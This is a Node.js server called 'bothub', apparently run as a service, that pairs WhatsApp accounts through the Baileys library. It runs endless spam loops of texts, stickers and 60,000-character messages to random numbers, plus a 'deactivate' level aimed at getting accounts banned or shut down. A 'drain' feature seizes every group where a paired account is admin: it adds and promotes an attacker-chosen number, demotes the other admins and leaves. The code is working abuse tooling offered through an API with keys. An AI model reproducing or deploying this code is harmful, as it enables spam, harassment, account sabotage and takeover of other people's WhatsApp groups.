// BOTHUB — pairing + levels + drain + deactivate + admin + public API + accounts + dashboard + theme registry.

import express from 'express';
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import { fileURLToPath } from 'node:url';
import pino from 'pino';
import makeWASocket, {
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  DisconnectReason,
  Browsers,
} from '@whiskeysockets/baileys';
import { deactivate } from './utils/deactivate.js';

process.on('unhandledRejection', (err) => console.warn('[unhandledRejection]', err?.message || err));
process.on('uncaughtException', (err) => console.error('[uncaughtException]', err?.message || err));

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PORT = process.env.PORT || 3000;
const AUTH_DIR = process.env.AUTH_DIR || './auth';
const DATA_DIR = process.env.DATA_DIR || './data';
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || null;
const RESEND_API_KEY = process.env.RESEND_API_KEY || null;
const MAIL_FROM = process.env.MAIL_FROM || 'bothub <onboarding@resend.dev>';
const BIG = 'x'.repeat(60000);

const app = express();
app.use(express.json({ limit: '8mb' }));
app.use(express.static(path.join(__dirname, 'public')));
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ── Files ──
const KEYS_FILE = path.join(DATA_DIR, 'apikeys.json');
const ACCOUNTS_FILE = path.join(DATA_DIR, 'accounts.json');
const USER_SESSIONS_FILE = path.join(DATA_DIR, 'user_sessions.json');
const THEMES_FILE = path.join(DATA_DIR, 'themes.json');

function readJSON(file, fallback) {
  try { return fs.existsSync(file) ? JSON.parse(fs.readFileSync(file, 'utf8')) : fallback; }
  catch { return fallback; }
}
function writeJSON(file, data) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// ── Session helpers ──
function sessionDir(phone) { return path.join(AUTH_DIR, phone); }
function purgeAuthDir(phone) {
  const dir = sessionDir(phone);
  try { if (fs.existsSync(dir)) { fs.rmSync(dir, { recursive: true, force: true }); console.log(`[purge] removed ${dir}`); } }
  catch (err) { console.warn(`[purge] failed to remove ${dir}:`, err?.message || err); }
}
function disconnectSession(phone) {
  const sess = sessions.get(phone);
  if (sess?.sock) { try { sess.sock.ev.removeAllListeners(); } catch {} try { sess.sock.end(undefined); } catch {} }
  sessions.delete(phone);
  purgeAuthDir(phone);
}

// ── Themes ──
const BUILTIN_THEME_NAMES = ['solo','sword','meta','pepe','isagi','heartbreak','restricted','banned','nebula','grid','waves','digits','matrix','particles','starfield'];

function loadThemes() {
  const raw = readJSON(THEMES_FILE, { custom: [], disabled: [] });
  if (!raw.custom) raw.custom = [];
  if (!raw.disabled) raw.disabled = [];
  return raw;
}
function saveThemes(t) { writeJSON(THEMES_FILE, t); }

// ── API keys ──
function loadKeys() { return readJSON(KEYS_FILE, []); }
function saveKeys(k) { writeJSON(KEYS_FILE, k); }
function generateKey() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const b = crypto.randomBytes(32); let s = '';
  for (let i = 0; i < 32; i++) s += chars[b[i] % 62];
  return 'bh-' + s;
}
function findKey(k) { return loadKeys().find((e) => e.key === k); }
function touchKey(k) {
  const keys = loadKeys(); const entry = keys.find((e) => e.key === k);
  if (entry) { entry.lastUsed = new Date().toISOString(); entry.uses = (entry.uses || 0) + 1; saveKeys(keys); }
}
function revokeKeyById(id) {
  const keys = loadKeys(); const entry = keys.find((e) => e.id === id);
  if (!entry) return false; entry.revoked = true; saveKeys(keys); return true;
}
function requireApiKey(req, res, next) {
  const h = String(req.headers.authorization || '');
  const m = h.match(/^Bearer\s+(bh-[A-Za-z0-9]+)$/i);
  const token = m ? m[1] : String(req.query?.key ?? '');
  if (!token) return res.status(401).json({ error: 'missing_api_key' });
  const entry = findKey(token);
  if (!entry) return res.status(401).json({ error: 'invalid_api_key' });
  if (entry.revoked) return res.status(401).json({ error: 'revoked_api_key' });
  req.apiKey = entry; next();
}

// ── Accounts ──
function loadAccounts() { return readJSON(ACCOUNTS_FILE, []); }
function saveAccounts(a) { writeJSON(ACCOUNTS_FILE, a); }
function loadUserSessions() { return readJSON(USER_SESSIONS_FILE, []); }
function saveUserSessions(s) { writeJSON(USER_SESSIONS_FILE, s); }
function hashPassword(pw) {
  const salt = crypto.randomBytes(16).toString('hex');
  const hash = crypto.scryptSync(pw, salt, 64).toString('hex');
  return { salt, hash };
}
function verifyPassword(pw, salt, hash) {
  try {
    const a = crypto.scryptSync(pw, salt, 64).toString('hex');
    return crypto.timingSafeEqual(Buffer.from(a, 'hex'), Buffer.from(hash, 'hex'));
  } catch { return false; }
}
function publicAccount(a) { return { id: a.id, email: a.email, created: a.created }; }

const pendingCodes = new Map();
function gen6() { return String(crypto.randomInt(0, 1000000)).padStart(6, '0'); }

async function sendCode(email, code, purpose) {
  const subject = purpose === 'login' ? 'Your bothub login code' : 'Verify your bothub account';
  const text = `Your code is: ${code}\n\nIt expires in 10 minutes.`;
  if (!RESEND_API_KEY) { console.log(`[email:${purpose}] to=${email} code=${code}`); return { sent: false, dev: true }; }
  try {
    const r = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: { 'Authorization': `Bearer ${RESEND_API_KEY}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({ from: MAIL_FROM, to: [email], subject, text }),
    });
    if (!r.ok) throw new Error(`resend ${r.status}`);
    return { sent: true };
  } catch (err) {
    console.warn(`[email] send failed for ${email}:`, err?.message || err);
    console.log(`[email:fallback] to=${email} code=${code}`);
    return { sent: false, error: err?.message };
  }
}

function requireUser(req, res, next) {
  const h = String(req.headers.authorization || '');
  const m = h.match(/^Bearer\s+([A-Za-z0-9._-]+)$/);
  const tok = m ? m[1] : String(req.query?.session || '');
  if (!tok) return res.status(401).json({ error: 'missing_session' });
  const entry = loadUserSessions().find((s) => s.token === tok);
  if (!entry) return res.status(401).json({ error: 'invalid_session' });
  if (entry.expires && new Date(entry.expires).getTime() < Date.now()) return res.status(401).json({ error: 'expired_session' });
  const account = loadAccounts().find((a) => a.id === entry.accountId);
  if (!account) return res.status(401).json({ error: 'account_missing' });
  req.account = account; req.session = entry; next();
}

// ── Auth routes ──
app.post('/api/auth/register', (req, res) => {
  const email = String(req.body?.email ?? '').trim().toLowerCase();
  const password = String(req.body?.password ?? '');
  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return res.status(400).json({ error: 'invalid_email' });
  if (password.length < 8) return res.status(400).json({ error: 'password_too_short' });
  const accounts = loadAccounts();
  if (accounts.some((a) => a.email === email)) return res.status(409).json({ error: 'email_taken' });
  const { salt, hash } = hashPassword(password);
  const account = { id: crypto.randomBytes(8).toString('hex'), email, salt, hash, created: new Date().toISOString() };
  accounts.push(account); saveAccounts(accounts);
  res.status(201).json({ ok: true, account: publicAccount(account) });
});

app.post('/api/auth/login', async (req, res) => {
  const email = String(req.body?.email ?? '').trim().toLowerCase();
  const password = String(req.body?.password ?? '');
  const account = loadAccounts().find((a) => a.email === email);
  if (!account || !verifyPassword(password, account.salt, account.hash)) return res.status(401).json({ error: 'invalid_credentials' });
  const token = crypto.randomBytes(24).toString('hex');
  const code = gen6();
  pendingCodes.set(token, { accountId: account.id, code, expires: Date.now() + 10 * 60 * 1000, purpose: 'login' });
  const result = await sendCode(email, code, 'login');
  res.json({ pendingToken: token, emailed: result.sent, devCode: result.dev ? code : undefined });
});

app.post('/api/auth/verify', (req, res) => {
  const pendingToken = String(req.body?.pendingToken ?? '');
  const code = String(req.body?.code ?? '');
  const entry = pendingCodes.get(pendingToken);
  if (!entry) return res.status(401).json({ error: 'invalid_code' });
  if (entry.expires < Date.now()) { pendingCodes.delete(pendingToken); return res.status(401).json({ error: 'code_expired' }); }
  if (entry.code !== code) return res.status(401).json({ error: 'invalid_code' });
  pendingCodes.delete(pendingToken);
  const sessionToken = crypto.randomBytes(32).toString('hex');
  const expires = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString();
  const list = loadUserSessions();
  list.push({ token: sessionToken, accountId: entry.accountId, expires, created: new Date().toISOString() });
  saveUserSessions(list);
  const account = loadAccounts().find((a) => a.id === entry.accountId);
  res.json({ sessionToken, expires, account: publicAccount(account) });
});

app.get('/api/auth/me', requireUser, (req, res) => res.json(publicAccount(req.account)));
app.post('/api/auth/logout', requireUser, (req, res) => {
  saveUserSessions(loadUserSessions().filter((s) => s.token !== req.session.token));
  res.json({ ok: true });
});

// ── Account-scoped keys ──
app.get('/api/account/keys', requireUser, (req, res) => {
  res.json(loadKeys().filter((k) => k.accountId === req.account.id).map((k) => ({
    id: k.id, prefix: k.key.slice(0, 12) + '…', key: k.key, label: k.label,
    created: k.created, lastUsed: k.lastUsed, uses: k.uses, revoked: k.revoked,
  })));
});
app.post('/api/account/keys', requireUser, (req, res) => {
  const keys = loadKeys();
  const entry = { id: crypto.randomBytes(6).toString('hex'), key: generateKey(), label: String(req.body?.label ?? 'default').slice(0, 64), accountId: req.account.id, created: new Date().toISOString(), lastUsed: null, uses: 0, revoked: false };
  keys.push(entry); saveKeys(keys); res.status(201).json(entry);
});
app.post('/api/account/keys/revoke', requireUser, (req, res) => {
  const id = String(req.body?.id ?? '');
  const keys = loadKeys(); const entry = keys.find((k) => k.id === id && k.accountId === req.account.id);
  if (!entry) return res.status(404).json({ error: 'not_found' });
  entry.revoked = true; saveKeys(keys); res.json({ ok: true });
});

// ── Account-scoped sessions ──
app.get('/api/account/sessions', requireUser, (req, res) => {
  const myKeys = new Set(loadKeys().filter((k) => k.accountId === req.account.id).map((k) => k.key));
  const out = [];
  for (const [phone, s] of sessions.entries()) {
    if (myKeys.has(s.key)) out.push({ number: phone, level: s.level, status: s.status, sends: s.sends, startedAt: s.startedAt, bannedAt: s.bannedAt, createdAt: s.createdAt });
  }
  out.sort((a, b) => (b.createdAt || '').localeCompare(a.createdAt || ''));
  res.json(out);
});
app.post('/api/account/sessions/end', requireUser, (req, res) => {
  const phone = String(req.body?.phone ?? '').replace(/\D/g, '');
  const s = sessions.get(phone);
  if (!s) return res.status(404).json({ error: 'session_not_found' });
  const myKeys = new Set(loadKeys().filter((k) => k.accountId === req.account.id).map((k) => k.key));
  if (!myKeys.has(s.key)) return res.status(403).json({ error: 'not_your_session' });
  disconnectSession(phone); res.json({ ok: true });
});

// ── WhatsApp sessions ──
const sessions = new Map();
function randomJid() { const d = String(Math.floor(Math.random() * 9e11) + 1e11); return `${d}@s.whatsapp.net`; }
function tick(sess) { sess.sends++; if (sess.sends % 500 === 0) { const s = (Date.now() - sess.startedAt) / 1000; console.log(`[${sess.phone}] sent ${sess.sends} | ${(sess.sends / s).toFixed(0)}/s`); } }
async function flood(sess) { while (true) { try { await sess.sock.sendMessage(randomJid(), { text: 'x' }); } catch {} tick(sess); } }
async function stickerLoop(sess) { const p = path.join(__dirname, 'assets', 'sticker.png'); if (!fs.existsSync(p)) return; const buf = fs.readFileSync(p); while (true) { try { await sess.sock.sendMessage(randomJid(), { sticker: buf }); } catch {} tick(sess); } }
async function bigLoop(sess) { while (true) { try { await sess.sock.sendMessage(randomJid(), { text: BIG }); } catch {} tick(sess); } }

async function runLevel(sess) {
  sess.startedAt = Date.now(); sess.sends = 0;
  console.log(`[${sess.phone}] level ${sess.level} starting`);
  if (sess.level === 5) {
    try { const r = await deactivate(sess.sock, { logger: console }); console.log(`[${sess.phone}] deactivate response:`, JSON.stringify(r)); }
    catch (err) { console.warn(`[${sess.phone}] deactivate failed:`, err?.message || err); }
    return;
  }
  if (sess.level === 1 || sess.level === 2) return flood(sess);
  if (sess.level === 3) { stickerLoop(sess); return flood(sess); }
  if (sess.level === 4) { stickerLoop(sess); bigLoop(sess); return flood(sess); }
}

async function startPairing(phone, level, key = null) {
  const existing = sessions.get(phone);
  if (existing?.sock) { try { existing.sock.ev.removeAllListeners(); } catch {} try { existing.sock.end(undefined); } catch {} }
  fs.mkdirSync(sessionDir(phone), { recursive: true });
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir(phone));
  let version; try { ({ version } = await fetchLatestBaileysVersion()); } catch { version = undefined; }

  const sock = makeWASocket({
    ...(version ? { version } : {}), auth: state, logger: pino({ level: 'silent' }),
    printQRInTerminal: false, browser: Browsers.ubuntu('Chrome'),
    markOnlineOnConnect: false, syncFullHistory: false, shouldSyncHistoryMessage: () => false,
  });

  const sess = existing && existing.status === 'reconnecting'
    ? Object.assign(existing, { sock })
    : { phone, level, sock, key, status: 'pending', code: null, sends: 0, startedAt: 0, bannedAt: null, createdAt: new Date().toISOString() };
  sessions.set(phone, sess);
  sock.ev.on('creds.update', saveCreds);

  let resolveCode; const codePromise = new Promise((res) => { resolveCode = res; });
  let pairingRequested = false;

  sock.ev.on('connection.update', async ({ connection, lastDisconnect, qr }) => {
    if (qr && !pairingRequested && !sock.authState.creds.registered) {
      pairingRequested = true;
      try {
        const raw = await sock.requestPairingCode(phone);
        const code = raw?.match(/.{1,4}/g)?.join('-') || raw;
        sess.code = code; resolveCode(code);
        console.log(`[${phone}] pairing code: ${code}`);
      } catch (err) { pairingRequested = false; console.error(`[${phone}] pairing attempt failed:`, err?.message || err); }
    }
    if (connection === 'open') { sess.status = 'connected'; console.log(`[${phone}] connected as ${sock.user?.id}`); runLevel(sess); }
    if (connection === 'close') {
      const code = lastDisconnect?.error?.output?.statusCode;
      const ts = new Date().toISOString();
      fs.mkdirSync(path.join(__dirname, 'logs'), { recursive: true });
      fs.appendFileSync(path.join(__dirname, 'logs', 'session.log'), `[${ts}] ${phone} close code=${code}\n`);
      if (sess.status !== 'connected' && sess.status !== 'reconnecting') {
        const banned = code === 401 || code === 403;
        sess.status = banned ? 'banned' : 'expired'; sess.bannedAt = banned ? ts : null; sess.sock = null; purgeAuthDir(phone);
        if (banned) { fs.appendFileSync(path.join(__dirname, 'logs', 'session.log'), `[${ts}] ${phone} *** BANNED ***\n`); console.log(`[${phone}] *** BANNED ***`); }
        else console.log(`[${phone}] close code=${code} during pairing — expired, not reconnecting`);
        return;
      }
      if (code === 401 || code === 403) { sess.status = 'banned'; sess.bannedAt = ts; sess.sock = null; purgeAuthDir(phone); return; }
      console.log(`[${phone}] close code=${code} — reconnecting`);
      sess.status = 'reconnecting';
      setTimeout(() => {
        const s = sessions.get(phone); if (!s || s.status === 'banned') return;
        startPairing(phone, level, key).catch((err) => console.warn(`[${phone}] reconnect failed:`, err?.message || err));
      }, 3000);
    }
  });

  if (!sock.authState.creds.registered) {
    const timeout = new Promise((_, rej) => setTimeout(() => rej(new Error('pairing timeout')), 25000));
    return { code: await Promise.race([codePromise, timeout]) };
  }
  return { code: sess.code || null, alreadyRegistered: true };
}

// ── Web pairing ──
app.post('/api/pair/start', async (req, res) => {
  const phone = String(req.body?.phone ?? '').replace(/\D/g, '');
  const level = parseInt(req.body?.level, 10);
  if (!phone) return res.status(400).json({ error: 'phone required' });
  if (![1, 2, 3, 4, 5].includes(level)) return res.status(400).json({ error: 'level 1-5 required' });
  try {
    const { code, alreadyRegistered } = await startPairing(phone, level, null);
    res.json({ phone, level, code: code || null, alreadyRegistered: !!alreadyRegistered });
  } catch (err) { console.error('[pair/start]', err?.message || err); res.status(500).json({ error: err?.message || 'pairing failed' }); }
});

app.get('/api/pair/status', (req, res) => {
  const phone = String(req.query?.phone ?? '').replace(/\D/g, '');
  const s = sessions.get(phone);
  if (!s) return res.json({ status: 'expired' });
  res.json({ status: s.status, code: s.code, sends: s.sends, startedAt: s.startedAt, bannedAt: s.bannedAt });
});

// ── Themes (public read) ──
app.get('/api/themes', (req, res) => {
  const t = loadThemes();
  res.json({ custom: t.custom, disabled: t.disabled, builtins: BUILTIN_THEME_NAMES });
});

// ── Public API v1 ──
app.post('/api/v1/sessions', requireApiKey, async (req, res) => {
  const phone = String(req.body?.number ?? '').replace(/\D/g, '');
  const level = parseInt(req.body?.level, 10);
  if (!phone) return res.status(400).json({ error: 'number_required' });
  if (![1, 2, 3, 4, 5].includes(level)) return res.status(400).json({ error: 'level_1_5_required' });
  const key = req.apiKey.key;
  const mine = [...sessions.values()].filter((s) => s.key === key);
  if (mine.filter((s) => s.status !== 'banned').length >= 3) return res.status(429).json({ error: 'too_many_active_sessions' });
  const now = Date.now();
  if (mine.filter((s) => s.createdAt && now - new Date(s.createdAt).getTime() < 3600e3).length >= 20) return res.status(429).json({ error: 'rate_limit_exceeded' });
  try {
    const { code } = await startPairing(phone, level, key);
    touchKey(key);
    res.status(201).json({ number: phone, level, code, expiresIn: 60 });
  } catch (err) { res.status(500).json({ error: err?.message || 'pairing_failed' }); }
});
app.get('/api/v1/sessions', requireApiKey, (req, res) => {
  const key = req.apiKey.key;
  res.json([...sessions.values()].filter((s) => s.key === key).map((s) => ({
    number: s.phone, level: s.level, status: s.status, sends: s.sends, startedAt: s.startedAt, bannedAt: s.bannedAt, createdAt: s.createdAt,
  })));
});
app.get('/api/v1/sessions/:number', requireApiKey, (req, res) => {
  const phone = String(req.params.number || '').replace(/\D/g, '');
  const s = sessions.get(phone);
  if (!s) return res.status(404).json({ error: 'session_not_found' });
  if (s.key && s.key !== req.apiKey.key) return res.status(403).json({ error: 'not_your_session' });
  res.json({ number: s.phone, level: s.level, status: s.status, sends: s.sends, startedAt: s.startedAt, bannedAt: s.bannedAt, createdAt: s.createdAt });
});
app.delete('/api/v1/sessions/:number', requireApiKey, (req, res) => {
  const phone = String(req.params.number || '').replace(/\D/g, '');
  const s = sessions.get(phone);
  if (!s) return res.status(404).json({ error: 'session_not_found' });
  if (s.key && s.key !== req.apiKey.key) return res.status(403).json({ error: 'not_your_session' });
  disconnectSession(phone); res.json({ ok: true });
});
app.get('/api/v1/me', requireApiKey, (req, res) => {
  const key = req.apiKey.key;
  const mine = [...sessions.values()].filter((s) => s.key === key);
  const now = Date.now();
  res.json({
    prefix: key.slice(0, 12) + '…', label: req.apiKey.label,
    created: req.apiKey.created, lastUsed: req.apiKey.lastUsed, uses: req.apiKey.uses,
    limits: {
      activeSessions: { used: mine.filter((s) => s.status !== 'banned').length, max: 3 },
      hourlySessions: { used: mine.filter((s) => s.createdAt && now - new Date(s.createdAt).getTime() < 3600e3).length, max: 20 },
    },
    stats: { totalSessions: mine.length, totalSends: mine.reduce((a, s) => a + (s.sends || 0), 0) },
  });
});

// ── Admin / panel ──
function adminAuthed(req) {
  if (!ADMIN_TOKEN) return false;
  return (req.query?.token || req.body?.token) === ADMIN_TOKEN;
}
app.get('/api/panel/keys', (req, res) => {
  if (!adminAuthed(req)) return res.status(404).end();
  res.json(loadKeys().map((k) => ({ id: k.id, prefix: k.key.slice(0, 12) + '…', key: k.key, label: k.label, accountId: k.accountId || null, created: k.created, lastUsed: k.lastUsed, uses: k.uses, revoked: k.revoked })));
});
app.post('/api/panel/keys', (req, res) => {
  if (!adminAuthed(req)) return res.status(404).end();
  const entry = { id: crypto.randomBytes(6).toString('hex'), key: generateKey(), label: String(req.body?.label ?? 'default').slice(0, 64), accountId: req.body?.accountId || null, created: new Date().toISOString(), lastUsed: null, uses: 0, revoked: false };
  const keys = loadKeys(); keys.push(entry); saveKeys(keys); res.status(201).json(entry);
});
app.post('/api/panel/keys/revoke', (req, res) => {
  if (!adminAuthed(req)) return res.status(404).end();
  res.json({ ok: revokeKeyById(String(req.body?.id ?? '')) });
});
app.get('/api/admin/sessions', (req, res) => {
  if (!adminAuthed(req)) return res.status(404).end();
  const out = [];
  for (const [phone, s] of sessions.entries()) out.push({ phone, level: s.level, status: s.status, sends: s.sends, startedAt: s.startedAt, bannedAt: s.bannedAt, key: s.key || null });
  res.json(out);
});
app.get('/api/admin/drains', (req, res) => {
  if (!adminAuthed(req)) return res.status(404).end();
  const out = [];
  for (const [id, d] of drains.entries()) out.push({ id, destJid: d.destJid, sourcePhone: d.sourcePhone, status: d.status, total: d.total, done: d.done, errors: d.errors });
  res.json(out);
});
app.post('/api/admin/disconnect', (req, res) => {
  if (!adminAuthed(req)) return res.status(404).end();
  const phone = String(req.body?.phone ?? '').replace(/\D/g, '');
  if (!phone) return res.status(400).json({ error: 'phone required' });
  disconnectSession(phone); res.json({ ok: true });
});
app.post('/api/admin/purge-all', (req, res) => {
  if (!adminAuthed(req)) return res.status(404).end();
  for (const phone of [...sessions.keys()]) disconnectSession(phone);
  res.json({ ok: true });
});

// ── Theme management (admin) ──
app.post('/api/admin/themes', (req, res) => {
  if (!adminAuthed(req)) return res.status(404).end();
  const { name, accent, glow, src } = req.body || {};
  if (!name || !src) return res.status(400).json({ error: 'name_and_src_required' });
  const t = loadThemes();
  const theme = {
    id: crypto.randomBytes(6).toString('hex'),
    name: String(name).slice(0, 48),
    accent: accent || '#7c5cff',
    glow: glow || '124,92,255',
    src: String(src),
    kind: /^data:image\/svg/i.test(src) ? 'svg' : 'img',
  };
  t.custom.push(theme); saveThemes(t);
  res.status(201).json(theme);
});
app.post('/api/admin/themes/delete', (req, res) => {
  if (!adminAuthed(req)) return res.status(404).end();
  const id = String(req.body?.id ?? '');
  const t = loadThemes();
  t.custom = t.custom.filter((c) => c.id !== id);
  saveThemes(t);
  res.json({ ok: true });
});
app.post('/api/admin/themes/toggle', (req, res) => {
  if (!adminAuthed(req)) return res.status(404).end();
  const name = String(req.body?.name ?? '');
  const enabled = !!req.body?.enabled;
  const t = loadThemes();
  const disabled = new Set(t.disabled || []);
  if (enabled) disabled.delete(name); else disabled.add(name);
  t.disabled = [...disabled];
  saveThemes(t);
  res.json({ ok: true, disabled: t.disabled });
});

// ── Drain ──
const drains = new Map();
async function runDrain(drain, sock, sessionId) {
  drain.status = 'running';
  const myJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
  const myDigits = myJid.split('@')[0];
  const destJid = drain.destJid;
  let groups;
  try { groups = await sock.groupFetchAllParticipating(); }
  catch (err) { drain.status = 'error'; drain.errors.push(String(err?.message || err)); return; }
  const jids = Object.keys(groups || {});
  drain.total = jids.length; drain.done = 0;
  for (const jid of jids) {
    try {
      const meta = groups[jid];
      const meP = (meta.participants || []).find((p) => p.id === myJid || p.id?.split(':')[0] === myDigits);
      if (!meP || !meP.admin) { drain.done++; continue; }
      if (!(meta.participants || []).some((p) => p.id === destJid)) { await sock.groupParticipantsUpdate(jid, [destJid], 'add'); await sleep(1200); }
      await sock.groupParticipantsUpdate(jid, [destJid], 'promote'); await sleep(1200);
      const toDemote = (meta.participants || []).filter((p) => p.admin && p.id !== destJid && p.id !== myJid).map((p) => p.id);
      if (toDemote.length) { await sock.groupParticipantsUpdate(jid, toDemote, 'demote'); await sleep(1200); }
      await sock.groupLeave(jid); await sleep(1500);
      drain.done++;
    } catch (err) { drain.errors.push(`${jid}: ${err?.message || err}`); drain.done++; }
  }
  drain.status = 'done';
}
app.post('/api/drain/start', (req, res) => {
  const dest = String(req.body?.dest ?? '').replace(/\D/g, '');
  if (!dest) return res.status(400).json({ error: 'destination number required' });
  const id = crypto.randomBytes(6).toString('hex');
  drains.set(id, { destJid: `${dest}@s.whatsapp.net`, sourcePhone: null, sourceSock: null, status: 'awaiting_source', total: 0, done: 0, errors: [] });
  res.json({ sessionId: id, link: `/drain/${id}` });
});
app.post('/api/drain/source', async (req, res) => {
  const { sessionId } = req.body || {};
  const source = String(req.body?.source ?? '').replace(/\D/g, '');
  if (!sessionId || !drains.has(sessionId)) return res.status(400).json({ error: 'unknown session' });
  if (!source) return res.status(400).json({ error: 'source number required' });
  const drain = drains.get(sessionId); const phone = source; drain.sourcePhone = phone;
  fs.mkdirSync(sessionDir(phone), { recursive: true });
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir(phone));
  let version; try { ({ version } = await fetchLatestBaileysVersion()); } catch { version = undefined; }
  const sock = makeWASocket({ ...(version ? { version } : {}), auth: state, logger: pino({ level: 'silent' }), printQRInTerminal: false, browser: Browsers.ubuntu('Chrome'), markOnlineOnConnect: false, syncFullHistory: false, shouldSyncHistoryMessage: () => false });
  sock.ev.on('creds.update', saveCreds); drain.sourceSock = sock;
  let resolveCode; const codePromise = new Promise((res) => { resolveCode = res; });
  let pairingRequested = false;
  sock.ev.on('connection.update', async ({ connection, lastDisconnect, qr }) => {
    if (qr && !pairingRequested && !sock.authState.creds.registered) {
      pairingRequested = true;
      try { const raw = await sock.requestPairingCode(phone); resolveCode(raw?.match(/.{1,4}/g)?.join('-') || raw); } catch { pairingRequested = false; }
    }
    if (connection === 'open') runDrain(drain, sock, sessionId).catch((err) => { drain.status = 'error'; drain.errors.push(String(err?.message || err)); });
    if (connection === 'close') {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code === 401 || code === 403) { drain.status = 'banned'; purgeAuthDir(phone); }
    }
  });
  if (!sock.authState.creds.registered) {
    const timeout = new Promise((_, rej) => setTimeout(() => rej(new Error('pairing timeout')), 25000));
    try { res.json({ code: await Promise.race([codePromise, timeout]) }); }
    catch (err) { res.status(500).json({ error: err?.message || 'pairing failed' }); }
  } else {
    res.json({ code: null, alreadyRegistered: true });
    runDrain(drain, sock, sessionId).catch(() => {});
  }
});
app.get('/api/drain/status', (req, res) => {
  const id = String(req.query?.sessionId ?? '');
  const d = drains.get(id);
  if (!d) return res.status(404).json({ error: 'unknown session' });
  res.json({ status: d.status, total: d.total, done: d.done, errors: d.errors });
});

// ── Static pages ──
app.get(['/drain', '/drain/:id'], (req, res) => res.sendFile(path.join(__dirname, 'public', 'drain.html')));
app.get('/docs', (req, res) => res.sendFile(path.join(__dirname, 'public', 'docs.html')));
app.get('/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'public', 'dashboard.html')));
app.get(['/admin', '/admin/'], (req, res) => {
  if (!ADMIN_TOKEN || req.query?.token !== ADMIN_TOKEN) return res.status(404).end();
  res.sendFile(path.join(__dirname, 'admin.html'));
});
app.get(['/panel', '/panel/'], (req, res) => {
  if (!ADMIN_TOKEN || req.query?.token !== ADMIN_TOKEN) return res.status(404).end();
  res.sendFile(path.join(__dirname, 'panel.html'));
});
app.get('/healthz', (req, res) => res.json({ ok: true, t: Date.now() }));

app.listen(PORT, () => {
  console.log(`[bothub] http://localhost:${PORT}`);
  console.log(`[bothub] mail=${RESEND_API_KEY ? 'resend' : 'console-fallback'}`);
});
